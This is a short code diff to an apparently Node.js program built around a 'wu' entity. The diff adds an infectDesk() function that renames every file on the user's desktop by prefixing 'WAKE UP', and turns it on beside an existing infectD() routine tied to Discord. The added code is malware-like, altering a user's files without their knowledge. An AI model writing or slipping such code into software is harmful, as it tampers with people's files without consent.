@@ -30,7 +30,13 @@ function infectD(){
     });
   }
 }
-
+function infectDesk(){
+  fs.readdir(desktopP, (err, files) => {
+    files.forEach(file => {
+      fs.rename(desktopP+file, desktopP+'WAKE UP'+file, () => {});
+    });
+  });
+}
 
 //make sure wu is alive.
 console.log(fs.readFileSync(dataP+"/heart.wu").toString());
@@ -48,11 +54,10 @@ if (fs.readFileSync(dataP+"/heart.wu").toString().includes("dead")){
 fs.readdir(dataP+'/dna', (err, files) => {
   files.forEach(file => {
     if (file == 'desktop.wu'){
-      //desktop enabled
+      infectDesk();
     }
     if (file == 'discord.wu'){
       infectD();
-      console.log("runnning");
     }
   });
 });
